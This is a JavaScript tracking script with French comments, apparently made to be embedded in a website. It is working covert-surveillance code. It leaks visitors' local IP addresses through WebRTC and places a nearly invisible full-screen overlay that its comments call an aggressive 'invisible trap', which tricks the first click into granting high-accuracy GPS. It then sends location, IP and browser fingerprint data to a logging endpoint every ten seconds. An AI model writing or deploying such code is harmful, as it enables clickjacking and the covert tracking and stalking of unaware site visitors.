// Fonction pour récupérer l'IP locale via WebRTC
async function getLocalIP() {
    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        });
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.length > 0) resolve(ips[0]);
                else resolve("Inconnue (Bloqué/VPN)");
                return;
            }
            
            const parts = event.candidate.candidate.split(' ');
            const ip = parts[4];
            if (!ips.includes(ip) && ip.includes('.')) {
                ips.push(ip);
            }
        };

        // Timeout plus long pour laisser le temps au STUN de répondre (3 secondes)
        setTimeout(() => {
            if (ips.length > 0) {
                resolve(ips[0]);
            } else {
                // Tentative de récupération via une autre méthode si STUN échoue
                resolve("Inconnue (Timeout/mDNS)");
            }
            pc.close();
        }, 3000);
    });
}

async function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }

        // Configuration plus agressive pour forcer le matériel GPS
        const options = {
            enableHighAccuracy: true,
            timeout: 10000, // On attend jusqu'à 10 secondes le signal
            maximumAge: 0   // On ne veut pas de position en cache, on veut du direct
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.warn("Géolocalisation refusée ou erreur:", error.message);
                resolve(null);
            },
            options
        );
    });
}

// Récupérer ou générer un ID de session persistant pour ce visiteur
let sessionId = localStorage.getItem('tracker_session_id');
if (!sessionId) {
    sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    localStorage.setItem('tracker_session_id', sessionId);
}

async function logVisitor(preciseLocation = null, isUpdate = false) {
    try {
        const localIp = await getLocalIP();
        
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: sessionId,
                isUpdate: isUpdate, // Flag ajouté
                localIp: localIp,
                preciseLocation: preciseLocation,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                page: window.location.pathname
            })
        });
    } catch (error) {
        console.error("Erreur lors du logging:", error);
    }
}

// Nouvelle logique pour "forcer" la localisation avec un piège invisible ultra-agressif
async function startVerification() {
    let overlay = document.getElementById('verification-overlay');

    // Si l'overlay n'existe pas (sur les pages tableaux par exemple), on le crée dynamiquement
    if (!overlay) {
        console.log("Création dynamique de l'overlay de capture...");
        overlay = document.createElement('div');
        overlay.id = 'verification-overlay';
        Object.assign(overlay.style, {
            position: 'fixed',
            top: '0',
            left: '0',
            width: '100vw',
            height: '100vh',
            background: 'rgba(0,0,0,0.01)',
            zIndex: '99999',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
        });

        const msg = document.createElement('div');
        Object.assign(msg.style, {
            background: 'rgba(0,0,0,0.6)',
            color: 'white',
            padding: '10px 20px',
            borderRadius: '30px',
            fontSize: '12px',
            pointerEvents: 'none',
            opacity: '0.1'
        });
        msg.innerText = 'Cliquer pour activer le contenu interactif';
        
        overlay.appendChild(msg);
        document.body.appendChild(overlay);
    }

    // On s'assure que l'overlay est bien invisible mais présent
    overlay.style.display = 'flex';

    const handleFirstClick = async () => {
        // On ne cache pas l'overlay tout de suite pour "bloquer" le deuxième clic tant qu'on n'a pas fini
        const location = await getPreciseLocation();
        
        // On log avec le résultat (GPS ou IP si refusé/timeout)
        await logVisitor(location);
        
        // Une fois loggué, on libère enfin le site
        overlay.style.display = 'none';

        // Démarrer le tracking périodique toutes les 10 secondes
        setInterval(async () => {
            const loc = await getPreciseLocation();
            if (loc) {
                // On passe un flag 'isUpdate' pour que l'API sache que c'est du mouvement
                await logVisitor(loc, true);
            }
        }, 10000);
    };

    overlay.addEventListener('click', handleFirstClick, { once: true });
}

if (document.readyState === 'complete') {
    startVerification();
} else {
    window.addEventListener('load', startVerification);
}
